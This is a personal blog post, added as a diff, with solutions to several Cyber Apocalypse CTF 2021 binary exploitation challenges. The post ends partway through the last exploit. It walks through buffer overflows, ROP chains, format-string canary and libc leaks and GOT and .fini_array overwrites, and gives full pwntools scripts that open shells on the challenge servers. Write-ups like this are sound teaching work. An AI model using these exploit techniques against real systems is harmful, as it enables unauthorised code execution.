@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>Cyber Apocalypse CTF 2021 Pwn Solutions</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+	==========================<br>
+	== <a href="https://ghariib.ir/">Gharib Personal Blog</a> ==<br>
+	==========================
+	<div style="float: right;">A Techi Personal Blog</div><br>
+	<p>
+	<nav>
+			<a href="/"><b>Start</b></a>.
+			
+			
+			<a href="/posts/"><b>Posts</b></a>.
+			
+			<a href="/categories/"><b>Categories</b></a>.
+			
+			<a href="/tags/"><b>Tags</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>Cyber Apocalypse CTF 2021 Pwn Solutions</h1>
+			<b><time>26.04.2021 08:06</time></b>
+		       
+
+			<div>
+				<h1 id="cyber-apocalypse-ctf-2021-pwn-solutions">Cyber Apocalypse CTF 2021 Pwn Solutions</h1>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>For anyone wondering what tools I used:</p>
+<ul>
+<li><a href="https://github.com/superkojiman/pwnbox">pwnbox</a> for a Docker test environment.</li>
+<li><a href="https://github.com/Gallopsled/pwntools">pwntools</a> for writing the exploits.</li>
+<li><a href="https://github.com/pwndbg/pwndbg">pwndbg</a> with <code>gdb</code> for debugging.</li>
+<li><a href="https://cutter.re/">Cutter</a> with Ghidra’s decompiler for reverse engineering.</li>
+</ul>
+<h2 id="controller">Controller</h2>
+<p>This binary challenge includes a copy of <code>libc.so.6</code> and is compiled with Full RELRO and NX.</p>
+<p>When executed, the binary will ask the user to enter two numbers, and to select from a mathematical operation that will either add, subtract, multiple, or divide the numbers. As long as either of the numbers are not greater than 69, the operation succeeds and the result is printed back to the user. If either of the numbers are greater than 69, the binary exits.</p>
+<p>The vulnerability lies in the <code>calculator()</code> function where it checks if the result of the mathematical operation is equal to 0xff3a, or 65338 in decimal. If it is, it enters a code branch where it prompts the user for input using <code>__isoc99_scanf(&quot;%s&quot;)</code>. <code>__isoc99_scanf(&quot;%s&quot;)</code> does not perform bounds checking which allows us to write past the buffer and overwrite <code>calculator()</code>’s saved return pointer, and hijack the binary’s execution flow. Specifically, the saved return pointer is 40 bytes from the end of the buffer <code>__isoc99_scanf()</code> writes to.</p>
+<p>Recall that the binary exits if either number entered by the user is greater than 69. This makes it impossible to provide two positive numbers that equal 65338. However, a second vulnerability exists, this time within the <code>calc()</code> function. The numbers entered are stored as unsigned integers which allow us to enter negative numbers. The result 65338 can be obtained by getting the difference of -65338 and -130876.</p>
+<p>Proof of concept where we overwrite the saved return pointer with “BBBBBBBB” (0x4242424242424242):</p>
+<pre tabindex="0"><code>► ./controller
+
+👾 Control Room 👾
+
+Insert the amount of 2 different types of recources: -65538 -130876
+Choose operation:
+
+1. ➕
+
+2. ➖
+
+3. ❌
+
+4. ➗
+
+&gt; 2
+-65538 - -130876 = 65338
+Something odd happened!
+Do you want to report the problem?
+&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
+Problem ingored
+Segmentation fault (core dumped)
+</code></pre><p>Examining the core dump shows that it tried to return to 0x4242424242424242:</p>
+<pre tabindex="0"><code>pwndbg&gt; bt
+#0  0x00000000004010fd in ?? ()
+#1  0x4242424242424242 in ?? ()
+#2  0x00007ffff7b87e00 in ?? ()
+#3  0x0000000100000000 in ?? ()
+#4  0x0000000000401170 in ?? ()
+#5  0x00007f78a16c6b97 in ?? ()
+#6  0x0000000000000001 in ?? ()
+#7  0x00007ffff7b87ef8 in ?? ()
+#8  0x0000000100008000 in ?? ()
+#9  0x0000000000401124 in ?? ()
+#10 0x0000000000000000 in ?? ()
+</code></pre><pre tabindex="0"><code>pwndbg&gt; f 1
+#1  0x4242424242424242 in ?? ()
+pwndbg&gt; context
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x10
+ RBX  0x0
+ RCX  0x0
+ RDX  0x401400
+ RDI  0x401400
+ RSI  0x0
+ R8   0xa
+ R9   0x7f78a1cb04c0 ◂— rol    byte ptr [rbx + rcx*8], 0xa1
+ R10  0x0
+ R11  0x246
+ R12  0x4006b0
+ R13  0x7ffff7b87ef0 ◂— 0x1
+ R14  0x0
+ R15  0x0
+ RBP  0x4141414141414141 (&#39;AAAAAAAA&#39;)
+ RSP  0x7ffff7b87e00 ◂— 0x7ffff7b87e00
+ RIP  0x4242424242424242 (&#39;BBBBBBBB&#39;)
+─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────
+Invalid address 0x4242424242424242
+</code></pre><p>There are no “win” functions in this binary to return to that will print out the flag, or give us a shell. Getting a shell means finding a way to execute <code>execve(&quot;/bin/sh&quot;)</code> from libc. Since libc is randomized, we need to calculate the target’s libc base address by leaking a function’s libc address and subtracting its offset from the provided <code>libc.so.6</code>.</p>
+<p>One solution is to utilize ROP gadgets to pop the address of <code>puts()</code> from the GOT into the RDI register, and then return to <code>puts()</code> at the PLT to have it print out the address of <code>puts()</code> in libc:</p>
+<pre tabindex="0"><code>buf  = b&#34;A&#34;*40
+buf += p64(rop.find_gadget([&#34;pop rdi&#34;, &#34;ret&#34;])[0])      # pop rdi gadgat
+buf += p64(elf.got.puts)                                # puts() in GOT
+buf += p64(elf.plt.puts)                                # puts() in PLT
+
+r.sendline(buf)
+
+r.recvline()
+puts_leak = int.from_bytes(r.recvline()[:6], &#34;little&#34;)
+print(f&#34;puts@libc leak: 0x{puts_leak:2x}&#34;)
+</code></pre><p>With the leaked libc address of <code>puts()</code>, it becomes trivial to calculate libc’s base address:</p>
+<pre tabindex="0"><code>libc.address = puts_leak - libc.sym.puts
+print(f&#34;libc base: 0x{libc.address:2x}&#34;)
+</code></pre><p>To find a gadget that executes <code>execve(&quot;/bin/sh&quot;)</code>, we can use the <code>one_gadget</code> tool:</p>
+<pre tabindex="0"><code>► one_gadget  ./libc.so.6
+0x4f3d5 execve(&#34;/bin/sh&#34;, rsp+0x40, environ)
+constraints:
+  rsp &amp; 0xf == 0
+  rcx == NULL
+
+0x4f432 execve(&#34;/bin/sh&#34;, rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a41c execve(&#34;/bin/sh&#34;, rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+</code></pre><p>We can add any of these offsets to libc’s base address and return to that to get a shell, but first we need to get the binary to prompt us for more data. One way to do that is to return to the start of <code>calculator()</code> and exploit the stack buffer overflow again, but this time changing the saved return pointer to point to a one-gadget address that calls <code>execve()</code>.</p>
+<p>Here’s the final exploit:</p>
+<pre tabindex="0"><code>#!/usr/bin/env python3
+
+from pwn import *
+
+def send_numbers():
+    # send numbers to calculator()
+    print(&#34;Sending numbers...&#34;)
+    r.recvuntil(&#34;: &#34;)
+    r.sendline(&#34;-65538 -130876&#34;)
+    r.recvuntil(&#34;&gt; &#34;)
+    r.sendline(&#34;2&#34;)
+    r.recvuntil(&#34;&gt; &#34;)
+
+context(os=&#34;linux&#34;, arch=&#34;amd64&#34;)
+elf = context.binary = ELF(&#34;controller&#34;)
+libc = ELF(&#34;./libc.so.6&#34;)
+
+rop = ROP(elf)
+pop_rdi = rop.find_gadget([&#34;pop rdi&#34;, &#34;ret&#34;])[0]
+
+r = remote(&#34;165.227.237.7&#34;, 32710)
+
+buf = b&#34;&#34;
+buf += b&#34;A&#34;*40
+buf += p64(pop_rdi)             # pop rdi; ret
+buf += p64(elf.got.puts)        # puts() at GOT
+buf += p64(elf.plt.puts)        # return to puts() at PLT to leak puts() at libc
+buf += p64(0x00401066)          # re-exploit calculator() again
+
+send_numbers()
+
+print(&#34;Sending payload 1...&#34;)
+r.sendline(buf)
+
+r.recvline()
+puts_leak = int.from_bytes(r.recvline()[:6], &#34;little&#34;)
+print(f&#34;puts@libc leak: 0x{puts_leak:2x}&#34;)
+
+libc.address = puts_leak - libc.sym.puts
+print(f&#34;libc base: 0x{libc.address:2x}&#34;)
+
+execve_gadget_offset = 0x4f3d5
+execve_gadget = libc.address + execve_gadget_offset
+print(f&#34;execve gadget: 0x{execve_gadget:2x}&#34;)
+
+# overwrite calculator()&#39;s saved return pointer with execve() gadget
+buf = b&#34;&#34;
+buf += b&#34;A&#34;*40 + p64(execve_gadget)
+
+send_numbers()
+
+print(&#34;Sending payload 2...&#34;)
+r.sendline(buf)
+
+print(&#34;Getting shell...&#34;)
+r.interactive()
+</code></pre><p>And here it is in action:</p>
+<pre tabindex="0"><code>► ./sploit.py SILENT=1
+Sending numbers...
+Sending payload 1...
+puts@libc leak: 0x7fe80cb5faa0
+libc base: 0x7fe80cadf000
+execve gadget: 0x7fe80cb2e3d5
+Sending numbers...
+Sending payload 2...
+Getting shell...
+Problem ingored
+$ cat flag.txt
+CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}
+</code></pre><h2 id="minefield">Minefield</h2>
+<p>This binary challenge is compiled with a stack canary and NX. There is no RELRO which means we can overwrite function pointers in the GOT.</p>
+<p>The binary itself is very simple. It prompts the user if they’re ready to plant a mine. Selecting No causes the binary to exit. Selecting Yes will prompt the user for a type of mine to use, and a location to plant it in. The user’s input is passed to <code>strtoull()</code> which converts it into an unsigned long long value. If we examine the disassembly of <code>mission()</code>, we see that the “type of mine” is actually an address that “location of mine” is written to. This is effectively a write primitive that allows us to write a value anywhere in memory that’s writable:</p>
+<pre tabindex="0"><code>0x00400ad5      mov     rdx, qword [location_of_mine]
+0x00400ad9      mov     rax, qword [type_of_mine]
+0x00400add      mov     qword [rax], rdx
+</code></pre><p>The first thought was to overwrite a function pointer in the GOT, but there are actually no functions called right after <code>mission()</code> returns. If we look at the writable sections reported by Cutter, we see that <code>.fini_array</code> is at 0x601078. This location contains a pointer to <code>__do_global_dtors_aux</code> which handles destructors.</p>
+<pre tabindex="0"><code>pwndbg&gt; x/a 0x601078
+0x601078:	0x400860 &lt;__do_global_dtors_aux&gt;
+</code></pre><p>Functions in <code>.fini_array</code> are called by the runtime linker when the program terminates. Since this section is writable, we can overwrite 0x601078 with an address of our choosing and control execution flow right before the binary terminates.</p>
+<p>As it turns out, this binary provides a “win” function that prints the flag. In this case, it’s called <code>_()</code> at 0x40096b. Exploitation is pretty simple at this point. When asked for the type of mine, we enter 0x601078, and when asked for a location, we enter 0x40096b:</p>
+<pre tabindex="0"><code>#!/usr/bin/env python3
+
+from pwn import *
+
+context(os=&#34;linux&#34;, arch=&#34;amd64&#34;)
+elf = context.binary = ELF(&#34;minefield&#34;)
+
+r = remote(&#34;178.62.14.240&#34;, 31535)
+
+r.recvuntil(&#34;&gt; &#34;)
+r.sendline(&#34;2&#34;)
+
+r.recvuntil(&#34;: &#34;)
+r.sendline(&#34;0x601078&#34;)           # .fini_array
+
+r.recvuntil(&#34;: &#34;)
+r.sendline(str(elf.sym._))       # get_flag function 0x40096b
+print(r.recvuntil(&#34;}&#34;))
+</code></pre><p>Running the script returns the flag:</p>
+<pre tabindex="0"><code>► ./sploit.py SILENT=1
+b&#39;We need to get out of here as soon as possible. Run!\n\nMission accomplished! \xe2\x9c\x94\nCHTB{d3struct0r5_m1n3f13ld}&#39;
+</code></pre><h2 id="system-drop">System dROP</h2>
+<p>This binary challenge is compiled with partial RELRO and NX. The name appears to imply that ROP is required to exploit this.</p>
+<p>The binary itself is fairly small. The <code>main()</code> function just reads 256 bytes from the user using <code>read()</code>:</p>
+<pre tabindex="0"><code>0x00400541      push rbp
+0x00400542      mov rbp, rsp
+0x00400545      sub rsp, 0x20
+0x00400549      mov edi, 0xf       ; 15
+0x0040054e      call alarm         ; sym.imp.alarm
+0x00400553      lea rax, [buf]
+0x00400557      mov edx, 0x100     ; 256 ; size_t nbyte
+0x0040055c      mov rsi, rax       ; void *buf
+0x0040055f      mov edi, 0         ; int fildes
+0x00400564      call read          ; sym.imp.read ; ssize_t read(int fildes, void *buf, size_t nbyte)
+0x00400569      mov eax, 1
+0x0040056e      leave
+0x0040056f      ret
+</code></pre><p>A user defined <code>syscall()</code> function exists for the sole purpose of providing a <code>syscall</code> gadget:</p>
+<pre tabindex="0"><code>0x00400537      push rbp
+0x00400538      mov rbp, rsp
+0x0040053b      syscall
+0x0040053d      ret
+</code></pre><p>There are no “win” functions, so that means we need to get a shell by executing <code>execve(&quot;/bin/sh&quot;)</code>. My initial thought was to use a <code>mprotect</code> syscall on a writable section to make it executable, <code>read()</code> shellcode into that location, and then return to it to get a shell. <code>mprotect</code> requires four parameters that need to be set in RDI, RSI, RDX, and RCX. A quick look at what gadgets are available in the binary show that we only have a pop RDI and RSI that are immediately accessible:</p>
+<pre tabindex="0"><code>► ropper --file system_drop --search &#39;pop r??&#39;
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop r??
+
+[INFO] File: system_drop
+0x00000000004005cc: pop r12; pop r13; pop r14; pop r15; ret;
+0x00000000004005ce: pop r13; pop r14; pop r15; ret;
+0x00000000004005d0: pop r14; pop r15; ret;
+0x00000000004005d2: pop r15; ret;
+0x00000000004004ab: pop rbp; mov edi, 0x601038; jmp rax;
+0x00000000004005cb: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
+0x00000000004005cf: pop rbp; pop r14; pop r15; ret;
+0x00000000004004b8: pop rbp; ret;
+0x00000000004005d3: pop rdi; ret;
+0x00000000004005d1: pop rsi; pop r15; ret;
+0x00000000004005cd: pop rsp; pop r13; pop r14; pop r15; ret;
+</code></pre><p>After some initial testing, it became clear that the <code>mprotect</code>&gt;<code>read()</code> chain would be too large to fit in 256 bytes as it would require us to utilize a <code>__libc_csu_init()</code> chain to store data in the RDX and RCX registers. A different approach was required.</p>
+<p>Upon closer examination of <code>main()</code>’s disassembly, the binary sets EAX to 1 right after <code>read()</code> is called. When <code>syscall</code> is called and RAX is 1, it calls the <code>write</code> syscall. This could be leveraged to call <code>write</code> and leak a libc address from the GOT.</p>
+<p>The GOT itself only contained entries for <code>alarm()</code> and <code>read()</code>:</p>
+<pre tabindex="0"><code>[0x601018] alarm@GLIBC_2.2.5 -&gt; 0x7ffff7ac8840 (alarm) ◂— mov    eax, 0x25
+[0x601020] read@GLIBC_2.2.5 -&gt; 0x7ffff7af4070 (read) ◂— lea    rax, [rip + 0x2e0881]
+</code></pre><p>With a libc leak, we can calculate libc’s base address and return to an <code>execve(&quot;/bin/sh&quot;)</code> gadget. While the binary didn’t come with an included <code>libc.so.6</code>, we did have one from the Controller challenge. I made the assumption that both binaries used the same version of libc and used it for the exploit. Here’s the first part of our exploit that leaks <code>alarm()</code> at libc’s address, and calculates libc’s base address:</p>
+<pre tabindex="0"><code>from pwn import *
+
+context(os=&#34;linux&#34;, arch=&#34;amd64&#34;)
+elf = context.binary = ELF(&#34;./system_drop&#34;)
+
+libc = ELF(&#34;./libc.so.6&#34;)
+
+pop_rdi = 0x4005d3               # pop rdi
+pop_rsi_chain = 0x4005d1         # pop rsi; pop r15; ret
+syscall = 0x40053b               # syscall; ret
+
+# Stage 1 : Leak a libc address
+# After the binary calls read(), it sets eax=1 which we can use for a write() syscall to leak
+# alarm()&#39;s libc address
+buf = b&#34;A&#34;*40
+buf += p64(pop_rdi)
+buf += p64(0x1)                 # stdout
+buf += p64(pop_rsi_chain)
+buf += p64(elf.got.alarm)       # alarm@got
+buf += p64(0x0)
+buf += p64(syscall)             # write() syscall which should give us the libc address we need
+
+r.sendline(buf)
+alarm_libc_leak = int.from_bytes(r.recv()[:6], &#34;little&#34;)
+print(f&#34;alarm@libc: 0x{alarm_libc_leak:2x}&#34;)
+
+libc.address = alarm_libc_leak - libc.sym.alarm
+print(f&#34;libc base: 0x{libc.address:2x}&#34;)
+</code></pre><p>So far so good:</p>
+<pre tabindex="0"><code>► ./sploit.py SILENT=1
+alarm@libc: 0x7f6da9056610
+libc base: 0x7f6da8f72000
+</code></pre><p>We already have a list of <code>execve()</code> offsets from the Controller challenge when we ran <code>one_gadget</code>. In order to execute it, we need to overwrite a function pointer in the GOT with the address of the <code>execve()</code> gadget. We can overwrite the address of <code>alarm()</code> at the GOT, and then call <code>alarm()</code> at PLT to call the <code>execve()</code> gadget. To do that, we need to call <code>read()</code> at PLT with the RDI register set to 0 (stdout), and RSI set to the address of <code>alarm()</code> at the GOT:</p>
+<pre tabindex="0"><code># Stage 2 : We have libc and calculated the address of a one-gadget-rce at this point
+# Call read() again to overwrite alarm@got with one-gadget-rce
+buf += p64(pop_rdi)
+buf += p64(0x0)                 # stdout
+buf += p64(pop_rsi_chain)       # pop rsi; pop r15; ret
+buf += p64(elf.got.alarm)       # alarm@got
+buf += p64(0x0)                 # junk for r15
+buf += p64(read_plt)            # read() in our one-gadget-rce into alamr@got
+</code></pre><p>When this chain executes, the binary will wait for input. At this point we can send the address of the <code>execve()</code> gadget to overwrite <code>alarm()</code> at the GOT, and then return to <code>alarm()</code> at the PLT.</p>
+<p>Here’s the final exploit:</p>
+<pre tabindex="0"><code>#!/usr/bin/env python3
+from pwn import *
+
+context(os=&#34;linux&#34;, arch=&#34;amd64&#34;)
+elf = context.binary = ELF(&#34;system_drop&#34;)
+
+libc = ELF(&#34;libc.so.6&#34;)
+
+read_plt = elf.plt.read
+
+pop_rdi = 0x4005d3               # pop rdi
+pop_rsi_chain = 0x4005d1         # pop rsi; pop r15; ret
+syscall = 0x40053b               # syscall; ret
+
+r = remote(&#34;139.59.185.150&#34;,30477)
+
+# Stage 1 : Leak a libc address
+# After the binary calls read(), it sets eax=1 which we can use for a write() syscall to leak
+# alarm()&#39;s libc address
+buf = b&#34;A&#34;*40
+buf += p64(pop_rdi)
+buf += p64(0x1)                 # stdout
+buf += p64(pop_rsi_chain)
+buf += p64(elf.got.alarm)       # alarm@got
+buf += p64(0x0)
+buf += p64(syscall)             # write() syscall which should give us the libc address we need
+
+# Stage 2 : We have libc and calculated the address of a one-gadget-rce at this point
+# Call read() again to overwrite alarm@got with one-gadget-rce
+buf += p64(pop_rdi)
+buf += p64(0x0)                 # stdout
+buf += p64(pop_rsi_chain)
+buf += p64(elf.got.alarm)       # alarm@got
+buf += p64(0x0)
+buf += p64(read_plt)            # read() in our one-gadget-rce into alamr@got
+
+# Stage 3 : Call alarm() to trigger call to do_system()
+buf += p64(elf.plt.alarm)
+
+r.sendline(buf)
+
+alarm_libc_leak = int.from_bytes(r.recv()[:6], &#34;little&#34;)
+print(f&#34;alarm@libc: 0x{alarm_libc_leak:2x}&#34;)
+
+libc.address = alarm_libc_leak - libc.sym.alarm
+print(f&#34;libc base: 0x{libc.address:2x}&#34;)
+
+execve_gadget = libc.address + 0x4f432        # execve() gadget offset
+r.sendline(p64(execve_gadget))
+
+r.interactive()
+</code></pre><p>Running it gives us a shell on the server to get the flag:</p>
+<pre tabindex="0"><code>► ./sploit.py SILENT=1
+alarm@libc: 0x7fc3459f7610
+libc base: 0x7fc345913000
+[*] Switching to interactive mode
+$ ls
+flag.txt  system_drop
+$ cat flag.txt
+CHTB{n0_0utput_n0_pr0bl3m_w1th_sr0p}
+</code></pre><h2 id="harvester">Harvester</h2>
+<p>This binary challenge includes a copy of <code>libc.so.6</code> and is compiled with the works: Full RELRO, NX, stack canary, and PIE. When executed, the binary gives the user four options:</p>
+<pre tabindex="0"><code>► ./harvester
+
+A wild Harvester appeared 🐦
+
+Options:
+
+[1] Fight 👊	[2] Inventory 🎒
+[3] Stare 👀	[4] Run 🏃
+&gt;
+</code></pre><p>After spending some time analyzing the binary in Cutter, we can determine the following:</p>
+<h3 id="fight">Fight</h3>
+<p>The <code>fight()</code> function prompts the user to select a weapon by reading 5 bytes from the user using <code>read()</code>. Whatever weapon is selected results in the message “You are not strong enough to fight yet.”. A format string vulnerability exists in this function which allows us to read pointers on the stack. We are able to leak the stack canary at positions 11, 15, and 19, as well as a libc address (<code>__libc_start_main()+231</code>) at position 21.</p>
+<p>Leaking the stack canary:</p>
+<pre tabindex="0"><code>Choose weapon:
+
+[1] 🗡		[2] 💣
+[3] 🏹		[4] 🔫
+&gt; %11$p
+
+Your choice is: 0x5420ef415fb19a00
+You are not strong enough to fight yet.
+</code></pre><p>Leaking <code>__libc_start_main()+231</code>:</p>
+<pre tabindex="0"><code>Choose weapon:
+
+[1] 🗡		[2] 💣
+[3] 🏹		[4] 🔫
+&gt; %21$p
+
+Your choice is: 0x7ffb61a7fb97
+You are not strong enough to fight yet.
+</code></pre><h3 id="inventory">Inventory</h3>
+<p>The <code>inventory()</code> function lists the number of pies a user has, and asks if they want to drop some pies, and how many. A vulnerability exists in this function where if a user enters a negative number, it actually increases the number of pies they have. A user starts with 10 pies, and dropping -10 pies leaves the user with 20 pies. The use of this vulnerability will become evident in the Stare option.</p>
+<h3 id="stare">Stare</h3>
+<p>The <code>stare()</code> function attempts to find a weakness in the Harvester, but will fail, and instead reward the user with 1 pie. Once the user has 15 pies, the message “You cannot carry more” is printed and the binary exits. There is a hidden branch in this function where if a user has 22 pies, the binary prompts the user to enter a string of up to 64 bytes.</p>
+<pre tabindex="0"><code>    rdi = &#34;\n[+] You found 1 &#34;;
+    printstr ();
+    eax = *(pie);
+    eax++;
+    eax = *(pie);
+    if (eax == 0x16) {
+        eax = 0;
+        printf (&#34;\e[1;32m&#34;);
+        rdi = &#34;\nYou also notice that if the Harvester eats too many pies, it falls asleep.&#34;;
+        printstr ();
+        rdi = &#34;\nDo you want to feed it?\n&gt; &#34;;
+        printstr ();
+        rax = &amp;buf;
+        read (0, rax, 0x40);
+        eax = 0;
+        printf (&#34;\e[1;31m&#34;);
+        rdi = &#34;\nThis did not work as planned..\n&#34;;
+        printstr ();
+    }
+</code></pre><p>A stack buffer overflow vulnerability exists which allows us to overwrite <code>stare()</code>’s saved return pointer. The saved return pointer is 56 bytes from the end of the buffer. In order to reach this code branch, we need to leverage the Inventory vulnerability to drop -11 pies so that the user ends up with 21 pies. When Stare is called, an extra pie is added to our inventory, leaving us with 22 pies.</p>
+<h3 id="run">Run</h3>
+<p>This simply exits the binary.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>We have everything we need to exploit the binary:</p>
+<ol>
+<li>Use Fight to leak the stack canary and a libc address. Calculate libc’s base address and get the offset of a <code>execve(&quot;/bin/sh&quot;)</code> gadget using the <code>one_gadget</code> tool.</li>
+<li>Use Inventory to drop -11 pies to get the 22 pies needed to enter the vulnerable code branch in Stare.</li>
+<li>Use Stare and send a large enough payload that overwrites the stack canary with the leaked canary, and overwrites the saved return pointer to return to the <code>execve()</code> gadget.</li>
+</ol>
+<p>Here’s the final exploit:</p>
+<pre tabindex="0"><code>#!/usr/bin/env python3
+
+from pwn import *
+
+context(os=&#34;linux&#34;, arch=&#34;amd64&#34;)
+elf = context.binary = ELF(&#34;harvester&#34;)
+libc = ELF(&#34;libc.so.6&#34;)
+
+r = remote(&#34;165.227.232.115&#34;, 30465)
+
+# Use Fight to leak stack canary at position 11
+r.recvuntil(&#34;&gt; &#34;)
+r.sendline(&#34;1&#34;)
+r.recvuntil(&#34;&gt; &#34;)
+r.sendline(&#34;%11$p&#34;)
+r.recvuntil(&#34;is: &#34;)
+canary = r.recvuntil(&#34;\n&#34;)[:18].decode(&#34;utf-8&#34;)
+print(&#34;leaked stack canary:&#34;, canary)
+
+# Use Fight to leak a libc address at position 21
+r.sendline(&#34;1&#34;)
+r.recvuntil(&#34;&gt; &#34;)
+r.sendline(&#34;%21$p&#34;)                             # leaks __libc_start_main+231
+r.recvuntil(&#34;is: &#34;)
+libc_leak = r.recvuntil(&#34;\n&#34;)[:14].decode(&#34;utf-8&#34;)
+print(&#34;leaked libc address:&#34;, libc_leak)
+
+libc.address = int(libc_leak, 16) - 138231      # offset of __libc_start_main+231
+print(f&#34;libc base: 0x{libc.address:2x}&#34;)
+
+# Use Inventory to increase pies to 21
+r.sendline(&#34;2&#34;)
+r.recvuntil(&#34;&gt; &#34;)
+r.sendline(&#34;y&#34;)
+r.recvuntil(&#34;&gt; &#34;)
+r.sendline(&#34;-11&#34;)                               # drop -11 pies
+r.recvuntil(&#34;&gt; &#34;)
+
+# Use Stare to exploit buffer overflow
+r.sendline(&#34;3&#34;)
+r.recvuntil(&#34;&gt; &#34;)
+
+execve_gadget = libc.address + 0x4f3d5          # execve() gadget offset
+
+buf  = b&#34;A&#34;*40
+buf += p64(int(canary, 16))                     # preserve stack canary
+buf += p64(0x0)                                 # padding
+buf += p64(execve_gadget)                       # return to execve() gadget
+r.sendline(buf)
+
+print(&#34;Getting shell...&#34;)
+r.interactive()
+</code></pre><p>Here it is in action popping a shell on the server:</p>
+<pre tabindex="0"><code>► ./sploit.py SILENT=1
+leaked stack canary: 0x32e62f8c8bdc5e00
+leaked libc address: 0x7f7ea9cfbbf7
+libc base: 0x7f7ea9cda000
+Getting shell...
+
+You try to find its weakness, but it seems invincible..
+Looking around, you see something inside a bush.
+[+] You found 1 \\x9f\xa5\xa7!
+
+You also notice that if the Harvester eats too many pies, it falls asleep.
+Do you want to feed it?
+&gt;
+This did not work as planned..
+$ ls
+flag.txt  harvester  libc.so.6
+$ cat flag.txt
+CHTB{h4rv35t3r_15_ju5t_4_b1g_c4n4ry}
+</code></pre><h2 id="save-the-environment">Save the Environment</h2>
+<p>This binary challenge includes a copy of <code>libc.so.6</code> and is compiled with Full Relro, stack canary, and NX.</p>
+<p>I did not complete this challenge during the CTFs allotted time frame, but completed it the day after. When executed, the binary prompts us for two options; plant a tree, or recycle. After analyzing the binary in Cutter, we can determine the following:</p>
+<h3 id="plant">Plant</h3>
+<p>The <code>plant()</code> function prompts the user for a type of tree to plant, and then a location to plant the tree. If this sounds familiar, it should, because the Minefield challenge used the same thing. This is essentially a write primitive that allows us to write to any writable memory address. The difference here is that the binary is compiled with Full RELRO so we can’t write to the GOT or <code>.fini_array</code>. We can only do this once. After <code>plant()</code> is called, the binary sets <code>rec_count</code> to 0x16. This causes the binary to exit when <code>check_fun()</code> is called and <code>rec_count</code> is greater than 0xb:</p>
+<pre tabindex="0"><code>    if (rec_count &gt;= 0) {
+        if (rec_count &lt;= 0xb) {
+            goto label_0;
+        }
+    }
+    rsi = &#34;green&#34;;
+    rdi = &#34;We have plenty of this already.\nThanks for your help!\n&#34;;
+    eax = 0;
+    color ();
+    exit (1);
+</code></pre><h3 id="recycle">Recycle</h3>
+<p>The <code>recycle()</code> function prompt the user for what material to recycle. Whatever option the user selects, the <code>form()</code> function is called which asks the user if this is their first time recycling. A counter is maintained in 0x603080 as <code>rec_count</code> which keeps track of how many times a user has recycled. If the user recyles 5 times, the binary leaks the libc address of <code>printf()</code>. If the user recycles 10 times, the binary allows the user to enter an arbitrary address and leaks its value. This is effectively a read primitive.</p>
+<h3 id="win-function">Win function</h3>
+<p>A function called <code>hidden_resources()</code> will print the contents of the flag. This function isn’t called by anything, so this is the target function we want to return to.</p>
+<h3 id="exploitation-1">Exploitation</h3>
+<p>Full RELRO prevents us from writing to the GOT or <code>.fini_array</code>. We can write to <code>__malloc_hook()</code> or <code>__free_hook()</code> in libc, but there’s nothing in the binary that would trigger a call to those functions. The only other option is to overwrite a saved return pointer on the stack, but in order to do that, we need a stack leak.</p>
+<p>As it turns out, we can leak a stack address by leaking <code>environ</code> in libc. <code>environ</code> contains a pointer to an address on the stack. By taking the difference of <code>environ</code> on the stack, and <code>plant()</code>’s saved return pointer on the stack, we can determine how many bytes to subtract from the leaked stack address and use <code>plant()</code> to overite the saved return pointer with the address of <code>hidden_resources()</code>. When <code>plant()</code> returns, it calls <code>hidden_resources()</code> which prints out the flag.</p>
+<p>This is the exploitaiton flow:</p>
+<ol>
+<li>Recycle 5 times to leak <code>printf()</code>’s libc address and calculate libc’s base address.</li>
+<li>Recycle 5 more times to allow us to leak the address of <code>environ</code> on the stack by sending <code>environ</code>’s libc address (libc base address + <code>environ</code>’s offset in libc).</li>
+<li>Calculate the difference between <code>environ</code> on the stack and <code>plant()</code>’s saved return pointer on the stack.</li>
+<li>Use the write primitive to overwrite <code>plant()</code>’s saved return pointer with the address of <code>hidden_resources()</code>.</li>
+</ol>
+<p>Here’s the final exploit:</p>
+<pre tabindex="0"><code>#!/usr/bin/env python3
+
+from pwn import *
+
+context(os=&#34;linux&#34;, arch=&#34;amd64&#34;)
+elf = context.binary = ELF(&#34;environment&#34;)
+libc = ELF(&#34;./libc.so.6&#34;)
+
+def recycle(count):
+    for i in range(count):
+        r.recvuntil(&#34;&gt; &#34;)
+        r.sendline(&#34;2&#34;)
+        r.recvuntil(&#34;&gt; &#34;)
+        r.sendline(&#34;1&#34;)
+        r.recvuntil(&#34;&gt; &#34;)
+        r.sendline(&#34;n&#34;)
+        r.recvline()
+        d  = r.recvline()
+    return d
+
+def plant(retptr, win):
+    r.sendline(&#34;1&#34;)
+    r.recvuntil(&#34;&gt; &#34;)
+    r.sendline(str(retptr))
+    r.recvuntil(&#34;&gt; &#34;)
+    r.sendline(str(win))
+    print(r.recvall())      # return the flag
+
+r = remote(&#34;138.68.182.108&#34;, 31093)
+
+# leak libc address (printf)
+d = recycle(5)
+d = d.decode(&#34;utf-8&#34;)[-16:].replace(&#34;]&#34;, &#34;&#34;)
+printf_libc = int(d, 16)
+print(f&#34;printf@libc: 0x{printf_libc:2x}&#34;)
+
+# get libc base address and find environ pointer in libc
+libc.address = printf_libc - libc.sym.printf
